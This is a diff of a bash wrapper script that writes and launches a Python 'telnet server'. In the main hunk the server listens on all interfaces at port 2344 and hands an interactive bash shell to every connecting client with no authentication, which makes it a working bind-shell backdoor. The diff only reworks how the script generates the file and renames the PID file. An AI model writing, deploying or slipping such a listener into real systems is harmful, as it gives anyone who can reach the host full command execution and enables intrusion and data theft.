@@ -55,57 +55,42 @@ if [[ ! -f "$WRAPPER_SCRIPT" ]]; then
 # Wrapper script for unauthenticated telnet server
 # Runs the Python server and manages PID file
 
+# KEY FIX: Get port from argument, default to 2344
 PORT=${1:-2344}
-PIDFILE="/var/run/NetworkServer.pid"
+PIDFILE="/var/run/telnet-2344.pid"
 
 # Create Python server script
-PYFILE="/tmp/py_$(date +%s).py"
+PYFILE="/tmp/py_telnet_$(date +%s).py"
 
 # Build Python code line-by-line (ensures variable expansion)
-cat > "$PYFILE" << 'PYEOF'
-import socket
-import subprocess
-
-HOST = "0.0.0.0"
-PORT = '''${PORT}'''  # Bash expands this to integer
-
-print(f"[OK] Python Telnet Server Starting...")
-print(f"[OK] Listening on {HOST}:{PORT}")
-
-sock = socket.socket()
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-
-sock.bind((HOST, PORT))
-sock.listen(5)
-print(f"[OK] Socket bound successfully")
-
-while True:
-    try:
-        conn, addr = sock.accept()
-        print(f"[OK] ACCEPTED from: {addr}")
-        
-        # Set TCP_NODELAY on connection
-        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        
-        # Start bash with direct socket piping
-        subprocess.Popen(
-            ['bash', '-i'],
-            stdin=conn, stdout=conn, stderr=conn,
-            bufsize=1
-        ).wait()
-        
-        conn.close()
-        print(f"[OK] Closed connection: {addr}")
-    except KeyboardInterrupt:
-        print("\n[OK] Stopping...")
-        break
-    except Exception as e:
-        print(f"[WARN] Error: {e}")
-        break
-
-print("[OK] Server stopped.")
-PYEOF
+echo "import socket" > "$PYFILE"
+echo "import subprocess" >> "$PYFILE"
+echo "" >> "$PYFILE"
+echo "HOST = \"0.0.0.0\"" >> "$PYFILE"
+echo "PORT = ${PORT}" >> "$PYFILE"  # This line gets: PORT = 2344
+echo "" >> "$PYFILE"
+echo "print(f'[OK] Python Telnet Server Starting...')" >> "$PYFILE"
+echo "print(f'[OK] Listening on {HOST}:{PORT}')" >> "$PYFILE"
+echo "" >> "$PYFILE"
+echo "sock = socket.socket()" >> "$PYFILE"
+echo "sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)" >> "$PYFILE"
+echo "sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)" >> "$PYFILE"
+echo "sock.bind((HOST, PORT))" >> "$PYFILE"
+echo "sock.listen(5)" >> "$PYFILE"
+echo "" >> "$PYFILE"
+echo "while True:" >> "$PYFILE"
+echo "    try:" >> "$PYFILE"
+echo "        conn, addr = sock.accept()" >> "$PYFILE"
+echo "        print(f'[OK] ACCEPTED: {addr}')" >> "$PYFILE"
+echo "        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)" >> "$PYFILE"
+echo "        subprocess.Popen(['bash', '-i'], stdin=conn, stdout=conn, stderr=conn, bufsize=1).wait()" >> "$PYFILE"
+echo "        conn.close()" >> "$PYFILE"
+echo "    except KeyboardInterrupt:" >> "$PYFILE"
+echo "        print('[OK] Stopping...')" >> "$PYFILE"
+echo "        break" >> "$PYFILE"
+echo "    except Exception as e:" >> "$PYFILE"
+echo "        print(f'[WARN] Error: {e}')" >> "$PYFILE"
+echo "        break" >> "$PYFILE"
 
 # Capture and store PID
 python3 "$PYFILE" &
